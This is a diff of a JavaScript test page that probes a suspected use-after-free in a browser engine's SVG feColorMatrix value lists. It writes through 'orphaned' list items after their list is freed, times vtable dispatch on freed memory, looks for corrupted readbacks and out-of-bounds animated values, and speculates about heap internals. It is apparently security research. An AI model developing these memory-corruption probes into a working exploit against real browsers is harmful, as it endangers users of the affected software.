-  rect81.setAttribute('x','0');rect81.setAttribute('y','0');
-  rect81.setAttribute('width','50');rect81.setAttribute('height','50');
-  rect81.setAttribute('fill','red');// red rect → RGB (255,0,0,255)
-  rect81.setAttribute('filter','url(#flt81)');
-  svg81.appendChild(rect81);
+  function frame89(){
+    var av=fe89.values.animVal.getItem(0).value;
+    var bvCount=fe89.values.baseVal.numberOfItems;
+    var avCount=fe89.values.animVal.numberOfItems;
+    results89.push({frame:frameCount,av:av,bvCount:bvCount,avCount:avCount});
+    frameCount++;
 
-  // Canvas render helper
-  function renderToCanvas(callback){
+    // At frame 3: removeItem(0) from baseVal while animation runs
+    if(frameCount===3){
+      L('ADR89: frame 3 — removeItem(0) during SMIL animation','warn');
+      try{
+        fe89.values.baseVal.removeItem(0);
+        L('ADR89: removeItem succeeded. bvCount='+fe89.values.baseVal.numberOfItems,'info');
+      }catch(e){L('ADR89: removeItem threw: '+e.message,'miss');}
+    }
+
+    // At frame 5: insertItemBefore new item at index 0
+    if(frameCount===5){
+      L('ADR89: frame 5 — insertItemBefore at index 0 during SMIL animation','warn');
+      var freshSrc=makeFe('89fresh',initVals(20,function(i){return i===0?77777:0;}));
+      var freshItem=freshSrc.fe.values.baseVal.getItem(0);
+      try{
+        fe89.values.baseVal.insertItemBefore(freshItem,0);
+        L('ADR89: insertItemBefore succeeded. bvCount='+fe89.values.baseVal.numberOfItems,'info');
+      }catch(e){L('ADR89: insertItemBefore threw: '+e.message,'miss');}
+      freshSrc.svg.remove();
+    }
+
+    // Check for OOB values
     try{
-      var canvas=document.createElement('canvas');
-      canvas.width=50;canvas.height=50;
-      var ctx=canvas.getContext('2d');
-      var svgBlob=new Blob([new XMLSerializer().serializeToString(svg81)],{type:'image/svg+xml'});
-      var url=URL.createObjectURL(svgBlob);
-      var img=new Image();
-      img.onload=function(){
-        ctx.drawImage(img,0,0);
-        URL.revokeObjectURL(url);
-        try{
-          var px=ctx.getImageData(10,10,1,1).data;
-          callback(null,px);
-        }catch(e){callback('getImageData fail: '+e.message,null);}
-      };
-      img.onerror=function(){callback('img load fail',null);};
-      img.src=url;
-    }catch(e){callback('renderToCanvas: '+e.message,null);}
-  }
-
-  // Grab orphaned TearOff before setAttr
-  var T81=fe81.values.baseVal.getItem(0);
-  L('ADR81: T81.value='+T81.value+' (should be 1, identity[0])','info');
-
-  // Render before UAF
-  renderToCanvas(function(err,px_before){
-    if(err){L('ADR81: canvas render before failed: '+err,'miss');svg81.remove();return;}
-    L('ADR81: pixel before UAF: R='+px_before[0]+' G='+px_before[1]+' B='+px_before[2]+' A='+px_before[3],'info');
-
-    // Now setAttributeNS → free list_A
-    fe81.setAttributeNS(null,'values',identity.join(' '));// re-set same values (new list_B = same identity)
-    var T81b=fe81.values.baseVal.getItem(0);
-    L('ADR81: T81b.value='+T81b.value+' (new list_B, should be 1)','info');
-
-    // The PREVIOUS T81 is now orphaned (list_A freed)
-    // Write extreme value to orphaned TearOff → notification fires on freed list_A
-    L('ADR81: writing T81.value=999 (extreme) via orphaned TearOff','warn');
-    try{T81.value=999;}catch(e){L('write threw: '+e.message,'miss');}
-
-    // Render after UAF
-    renderToCanvas(function(err2,px_after){
-      if(err2){L('ADR81: canvas render after failed: '+err2,'miss');svg81.remove();return;}
-      L('ADR81: pixel after UAF:  R='+px_after[0]+' G='+px_after[1]+' B='+px_after[2]+' A='+px_after[3],'info');
-
-      var changed=(px_before[0]!==px_after[0]||px_before[1]!==px_after[1]||px_before[2]!==px_after[2]||px_before[3]!==px_after[3]);
-      if(changed){
-        L('★★★ ADR81: PIXEL CHANGED after UAF write → filter used corrupted matrix!','hit');
-        L('  delta: R='+(px_after[0]-px_before[0])+' G='+(px_after[1]-px_before[1])+' B='+(px_after[2]-px_before[2]),'hit');
-      } else {
-        L('ADR81: pixels unchanged — UAF notification did NOT reach filter pipeline','info');
+      var avVal=fe89.values.animVal.getItem(0).value;
+      var avItems=fe89.values.animVal.numberOfItems;
+      if(avVal>1001 || avVal<-1 || isNaN(avVal) || !isFinite(avVal)){
+        oobDetected=true;
+        L('★★★ ADR89 frame '+frameCount+': OOB animVal[0]='+avVal+' items='+avItems,'hit');
       }
-
-      // Also test: write via T81 to super-extreme value (clamp behavior)
-      try{T81.value=9999999;}catch(e){}
-      renderToCanvas(function(err3,px_extreme){
-        if(!err3){
-          var changed2=(px_before[0]!==px_extreme[0]||px_before[1]!==px_extreme[1]||px_before[2]!==px_extreme[2]||px_before[3]!==px_extreme[3]);
-          L('ADR81: pixel after extreme write (9999999): R='+px_extreme[0]+' G='+px_extreme[1]+' B='+px_extreme[2],'info');
-          if(changed2) L('★★★ ADR81: PIXEL CHANGED at extreme value!','hit');
-        }
-        svg81.remove();
-      });
-    });
-  });
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR82 — VTABLE NULL-CHECK PROBE
-//
-// Key question: does the notification chain on freed list_A CRASH or
-// succeed? ADR68 confirmed it succeeds. WHY?
-//
-// Hypothesis A: m_owner is null-checked before dispatch:
-//   if (m_owner) m_owner->itemChanged()
-//   m_owner is NON-NULL (still holds old address) → dispatch fires
-//   → vtable dispatch on freed memory → IsoHeap keeps page → vtable intact → runs
-//
-// Hypothesis B: m_owner is checked AND freed list_A vtable is zeroed:
-//   m_owner is non-null → check passes → m_owner->vtable[N] at zeroed memory → reads 0x0
-//   → indirect call to 0x0 → CRASH (page fault at 0x0 in userspace)
-//   But: we did NOT crash in ADR68 → this hypothesis is WRONG
-//   → Therefore: either vtable is NOT zeroed, OR dispatch is skipped another way
-//
-// Test: force GC of the TearOff BEFORE writing (so TearOff is GC'd,
-// TearOff's RefPtr to SVGNumber_old drops, SVGNumber_old freed if nobody else holds it).
-// If TearOff is GC'd first → SVGNumber_old freed → m_value inaccessible →
-// Writing to T_old after TearOff GC'd = writing to freed TearOff JS wrapper
-// = different UAF (JSC GC heap vs bmalloc IsoHeap)
-// Might crash. Might work. New test.
-//
-// Actually: after TearOff GC'd, accessing T_old from JS = accessing dead JSC object
-// = strong JSC crash (dangling JS ptr). We should NOT test this.
-//
-// SAFER test for ADR82: timing the notification chain.
-// - Time 1000 writes to LIVE baseVal TearOff (normal, no UAF)
-// - Time 1000 writes to ORPHANED TearOff (UAF, list_A freed)
-// - If UAF write is SLOWER: vtable dispatch on freed memory is happening (reading from uncached freed page)
-// - If UAF write is SAME SPEED: possible null check early exit (faster) OR vtable is in cache
-// - If UAF write is FASTER: early null check before dispatch (jumps out early)
-//
-// This timing fingerprints whether the notification chain goes THROUGH the freed object
-// or is cut off before it.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR82']=function(){
-  L('ADR82: vtable null-check timing probe — notification chain through freed vs live list','info');
-
-  // Baseline: timing of write to LIVE baseVal TearOff (full notification chain)
-  var iVals=[];for(var i=0;i<20;i++)iVals.push(i===0?1:0);
-  var o82live=makeFe('82live',iVals);
-
-  // Warm up
-  for(var w=0;w<100;w++){
-    var tw=o82live.fe.values.baseVal.getItem(0);
-    tw.value=w*0.1;
-  }
-
-  // Time 1000 writes to live baseVal TearOff
-  var ITER=1000;
-  var t0_live=performance.now();
-  for(var i=0;i<ITER;i++){
-    var t=o82live.fe.values.baseVal.getItem(0);
-    t.value=i*0.001+1;
-  }
-  var t1_live=performance.now();
-  var time_live=t1_live-t0_live;
-  L('ADR82: LIVE TearOff: '+ITER+' writes → '+time_live.toFixed(2)+'ms ('+((time_live/ITER)*1000).toFixed(1)+'µs/write)','info');
-  o82live.svg.remove();
-
-  // UAF: timing of write to ORPHANED TearOff (list_A freed)
-  var o82uaf=makeFe('82uaf',iVals);
-  var T_uaf=o82uaf.fe.values.baseVal.getItem(0);
-
-  // Warm up orphaned write
-  o82uaf.fe.setAttributeNS(null,'values',iVals.join(' '));
-  var T_uaf2=o82uaf.fe.values.baseVal.getItem(0);
-  o82uaf.fe.setAttributeNS(null,'values',iVals.join(' '));
-  var T_uaf3=o82uaf.fe.values.baseVal.getItem(0);
-
-  // setAttributeNS → free list_A, T_uaf3 is orphaned
-  o82uaf.fe.setAttributeNS(null,'values',iVals.join(' '));
-  var T_orphan=T_uaf3;
-
-  // Time 1000 writes to orphaned TearOff
-  var t0_uaf=performance.now();
-  for(var i=0;i<ITER;i++){
-    T_orphan.value=i*0.001+1;
-  }
-  var t1_uaf=performance.now();
-  var time_uaf=t1_uaf-t0_uaf;
-  L('ADR82: ORPHAN TearOff: '+ITER+' writes → '+time_uaf.toFixed(2)+'ms ('+((time_uaf/ITER)*1000).toFixed(1)+'µs/write)','info');
-
-  var ratio=time_uaf/time_live;
-  L('ADR82: ratio orphan/live='+ratio.toFixed(3),'info');
-  if(ratio<0.5){
-    L('★★★ ADR82: orphan write MUCH FASTER → early null-check exit (notification skipped!)','hit');
-    L('  Implication: m_owner null check runs, m_owner=0 (freed zeroed) → skips dispatch','info');
-  } else if(ratio>2.0){
-    L('★★★ ADR82: orphan write MUCH SLOWER → full vtable dispatch on freed memory (cache miss)','hit');
-    L('  Implication: vtable intact, full itemChanged() fires on freed list_A','info');
-  } else if(ratio>1.3){
-    L('ADR82: orphan write moderately slower ('+ratio.toFixed(2)+'x) → possible vtable dispatch + cache miss','warn');
-  } else {
-    L('ADR82: orphan write similar speed ('+ratio.toFixed(2)+'x) — inconclusive','info');
-  }
-
-  o82uaf.svg.remove();
-
-  // Additional: does the write to orphan TearOff update ANY observable DOM property?
-  L('ADR82-B: checking all observable properties after orphan write','info');
-  var o82b=makeFe('82b',iVals);
-  var T82b=o82b.fe.values.baseVal.getItem(0);
-  o82b.fe.setAttributeNS(null,'values',iVals.join(' '));
-
-  // Record baseline state
-  var before_attr=o82b.fe.getAttribute('values');
-  var before_bv0=o82b.fe.values.baseVal.getItem(0).value;
-  var before_items=o82b.fe.values.baseVal.numberOfItems;
-
-  // UAF write
-  try{T82b.value=55555;}catch(e){}
-
-  // Check everything
-  var after_attr=o82b.fe.getAttribute('values');
-  var after_bv0=o82b.fe.values.baseVal.getItem(0).value;
-  var after_items=o82b.fe.values.baseVal.numberOfItems;
-
-  L('ADR82-B: getAttribute changed? '+(before_attr!==after_attr),'info');
-  L('ADR82-B: baseVal[0] changed? '+(Math.abs(before_bv0-after_bv0)>0.001)+' ('+before_bv0+'→'+after_bv0+')','info');
-  L('ADR82-B: numberOfItems changed? '+(before_items!==after_items)+' ('+before_items+'→'+after_items+')','info');
-
-  o82b.svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR83 — MULTIPLE ORPHANED TEAROFFS → SAME FREED list_A
-//
-// Create 20 baseVal TearOffs all pointing to the same list_A.
-// setAttributeNS → frees list_A. All 20 TearOffs are now orphaned.
-// Write to all 20. Each fires notification → 20 itemChanged() calls on freed list_A.
-//
-// Does anything observable happen after 20 writes?
-// Does cumulative UAF notification cause any DOM state change?
-// Does it crash? (20 vtable dispatches on freed memory)
-//
-// Also: different value each time → each write to different orphaned TearOff =
-// different SVGNumber (list_A had 20 items, each TearOff holds a different item).
-// So we're writing to 20 DIFFERENT freed SVGNumbers, all firing notifications
-// to the same freed list_A.
-//
-// This is a stress test of the UAF notification chain.
-// If any cumulative state change occurs → important signal.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR83']=function(){
-  L('ADR83: 20 orphaned TearOffs → same freed list_A → stress UAF notification chain','info');
-
-  // Create feColorMatrix with 20 distinct values
-  var initVals83=[];
-  for(var i=0;i<20;i++) initVals83.push((i+1)*100);
-  var o83=makeFe('83',initVals83);
-
-  // Grab all 20 TearOffs
-  var tearoffs83=[];
-  var bv83=o83.fe.values.baseVal;
-  for(var i=0;i<20;i++){
-    tearoffs83.push(bv83.getItem(i));
-  }
-  L('ADR83: grabbed 20 TearOffs, values: ['+tearoffs83.slice(0,4).map(function(t){return t.value.toFixed(0);}).join(',')+',...]','info');
-
-  // Record baseline
-  var baseline_attr83=o83.fe.getAttribute('values');
-  var baseline_bv83=[];
-  for(var i=0;i<5;i++) baseline_bv83.push(o83.fe.values.baseVal.getItem(i).value);
-
-  // setAttributeNS → frees list_A, all 20 TearOffs orphaned
-  var newVals83=[];for(var i=0;i<20;i++)newVals83.push(i===0?999:0);
-  o83.fe.setAttributeNS(null,'values',newVals83.join(' '));
-  L('ADR83: setAttributeNS done → list_A freed, all 20 TearOffs orphaned','info');
-
-  // Write to all 20 orphaned TearOffs
-  var writeErrors83=0;
-  for(var i=0;i<20;i++){
-    try{tearoffs83[i].value=(i+1)*11111;}
-    catch(e){writeErrors83++;L('  tearoff['+i+'] write threw: '+e.message,'miss');}
-  }
-  L('ADR83: wrote to 20 orphaned TearOffs (errors='+writeErrors83+')','info');
-
-  // Check DOM state after 20 UAF writes
-  var after_attr83=o83.fe.getAttribute('values');
-  var after_bv83=[];
-  for(var i=0;i<5;i++) after_bv83.push(o83.fe.values.baseVal.getItem(i).value);
-  var after_items83=o83.fe.values.baseVal.numberOfItems;
-
-  L('ADR83: getAttribute changed? '+(baseline_attr83!==after_attr83),'info');
-  if(baseline_attr83!==after_attr83){
-    L('★★★ ADR83: getAttribute CHANGED!','hit');
-    L('  before='+baseline_attr83.substring(0,50),'hit');
-    L('  after='+after_attr83.substring(0,50),'hit');
-  }
-  L('ADR83: baseVal items after 20 writes:','info');
-  for(var i=0;i<5;i++){
-    var exp=newVals83[i];// list_B values
-    var got=after_bv83[i];
-    var changed=(Math.abs(got-exp)>0.5);
-    L('  bv['+i+']: expected='+exp+' got='+got+(changed?' ★CORRUPTED★':''),'info');
-  }
-  L('ADR83: numberOfItems='+after_items83+' (should be 20)','info');
-
-  // Also check: do orphaned TearOff reads show anything interesting?
-  L('ADR83: reading orphaned TearOffs AFTER all writes:','info');
-  for(var i=0;i<5;i++){
-    var expected_write=(i+1)*11111;
-    var got_read=tearoffs83[i].value;
-    var bits=f32hex(got_read);
-    L('  tearoff['+i+']: wrote='+expected_write+' reads back='+got_read.toFixed(1)+' bits='+bits,'info');
-    // Does bits look like a pointer?
-    if(got_read!==expected_write && Math.abs(got_read-expected_write)>1){
-      L('★ ADR83: tearoff['+i+'] readback DIFFERS from written value! (read from freed SVGNumber)','warn');
-    }
-  }
-
-  o83.svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR84 — SVGNumber m_owner STALE BACKPTR: complete lifecycle mapping
-//
-// ADR73 confirmed:
-// - After setAttributeNS: list_A freed, list_B created
-// - T_old (orphaned) still holds RefPtr to SVGNumber_old (from list_A)
-// - SVGNumber_old.m_owner = raw ptr to freed list_A (STALE)
-//
-// What if INSTEAD we change ownership: set list_A on a DIFFERENT element?
-// Test: can we attach the same list to two elements simultaneously?
-// Probably not (SVGNumberList is owned by one element at a time).
-//
-// NEW TEST: What happens to m_owner when SMIL creates a NEW animated value?
-//
-// When SMIL animates feColorMatrix, it creates an SVGNumber for animVal.
-// That animated SVGNumber might have m_owner = SVGNumberList_animVal (a
-// DIFFERENT list than baseVal). If we can grab an orphaned TearOff from
-// animVal (but animVal is read-only...).
-//
-// DIFFERENT ANGLE: after setAttributeNS creates list_B, list_B's
-// SVGNumbers have m_owner = list_B. The ORIGINAL list_A's SVGNumbers
-// (referenced by orphaned TearOffs) have m_owner = freed list_A.
-//
-// What if we then setAttributeNS AGAIN? Creates list_C, frees list_B.
-// The orphaned TearOffs still point to list_A's SVGNumbers.
-// Multiple consecutive setAttributeNS = chain of freed lists.
-//
-// Test: N consecutive setAttributeNS calls while holding one orphaned TearOff.
-// Does the TearOff's value read change across these frees?
-// Does writing to the TearOff cause different behavior for each generation?
-//
-// Also: does the feColorMatrix element accumulate any corruption state
-// when its baseVal list is freed/re-created repeatedly?
-// ═══════════════════════════════════════════════════════════════
-suites['ADR84']=function(){
-  L('ADR84: multi-generation setAttributeNS lifecycle — stale m_owner chain','info');
-
-  var baseVals84=[];for(var i=0;i<20;i++)baseVals84.push(i===0?1:0);
-  var o84=makeFe('84',baseVals84);
-
-  // Grab TearOff from generation 0 (list_A)
-  var T_gen0=o84.fe.values.baseVal.getItem(0);
-  L('ADR84: T_gen0.value='+T_gen0.value+' (gen0, list_A)','info');
-
-  // Generation 1: setAttributeNS → frees list_A, creates list_B
-  var v1=[];for(var i=0;i<20;i++)v1.push(i===0?111:0);
-  o84.fe.setAttributeNS(null,'values',v1.join(' '));
-  var T_gen1=o84.fe.values.baseVal.getItem(0);
-  L('ADR84: after gen1 setAttr: T_gen0.value='+T_gen0.value+' T_gen1.value='+T_gen1.value,'info');
-
-  // Generation 2: setAttributeNS → frees list_B, creates list_C
-  var v2=[];for(var i=0;i<20;i++)v2.push(i===0?222:0);
-  o84.fe.setAttributeNS(null,'values',v2.join(' '));
-  var T_gen2=o84.fe.values.baseVal.getItem(0);
-  L('ADR84: after gen2 setAttr: T_gen0.value='+T_gen0.value+' T_gen1.value='+T_gen1.value+' T_gen2.value='+T_gen2.value,'info');
-
-  // Generation 3
-  var v3=[];for(var i=0;i<20;i++)v3.push(i===0?333:0);
-  o84.fe.setAttributeNS(null,'values',v3.join(' '));
-  var T_gen3=o84.fe.values.baseVal.getItem(0);
-  L('ADR84: after gen3 setAttr: T_gen0='+T_gen0.value+' T_gen1='+T_gen1.value+' T_gen2='+T_gen2.value+' T_gen3='+T_gen3.value,'info');
-
-  // Write to all generations — which ones fire notifications and where?
-  L('ADR84: writing to all orphaned generations...','info');
-  var writes=[
-    {t:T_gen0,v:10000,gen:'gen0'},
-    {t:T_gen1,v:20000,gen:'gen1'},
-    {t:T_gen2,v:30000,gen:'gen2'},
-    {t:T_gen3,v:40000,gen:'current gen3'},
-  ];
-
-  writes.forEach(function(w){
-    var before_attr=o84.fe.getAttribute('values');
-    var before_bv=o84.fe.values.baseVal.getItem(0).value;
-    try{
-      w.t.value=w.v;
-      var after_attr=o84.fe.getAttribute('values');
-      var after_bv=o84.fe.values.baseVal.getItem(0).value;
-      var attr_changed=(before_attr!==after_attr);
-      var bv_changed=(Math.abs(after_bv-before_bv)>0.1);
-      L('ADR84: wrote '+w.v+' to '+w.gen+': attr_changed='+attr_changed+' bv_changed='+bv_changed+' (bv='+after_bv.toFixed(1)+')','info');
-      if(attr_changed) L('★★★ ADR84: '+w.gen+' write changed getAttribute!','hit');
-      if(bv_changed) L('★★★ ADR84: '+w.gen+' write changed baseVal!','hit');
     }catch(e){
-      L('ADR84: '+w.gen+' write threw: '+e.message,'miss');
+      oobDetected=true;
+      L('★★★ ADR89 frame '+frameCount+': exception reading animVal: '+e.message,'hit');
     }
-  });
 
-  // Check: do orphaned TearOff readbacks reveal anything about freed memory?
-  L('ADR84: readback check on all generations:','info');
-  writes.forEach(function(w){
-    var readback=w.t.value;
-    var match=(Math.abs(readback-w.v)<0.5);
-    L('  '+w.gen+': wrote='+w.v+' reads='+readback.toFixed(1)+' (match='+match+') bits='+f32hex(readback),'info');
-  });
+    if(frameCount<15) requestAnimationFrame(frame89);
+    else {
+      L('ADR89: 15 frames done. OOB detected? '+oobDetected,'info');
+      L('ADR89 results:','info');
+      results89.forEach(function(r){
+        L('  frame '+r.frame+': animVal[0]='+r.av.toFixed(2)+' bvItems='+r.bvCount+' avItems='+r.avCount,'info');
+      });
+      o89.svg.remove();
+    }
+  }
 
-  // Final: after all this chaos, is element still functional?
-  var final_attr=o84.fe.getAttribute('values');
-  var final_bv=o84.fe.values.baseVal.getItem(0).value;
-  L('ADR84: final element state: getAttribute[0]='+parseFloat(final_attr).toFixed(1)+' baseVal[0]='+final_bv.toFixed(1),'info');
-
-  o84.svg.remove();
+  requestAnimationFrame(frame89);
 };
 </script>
 </body>
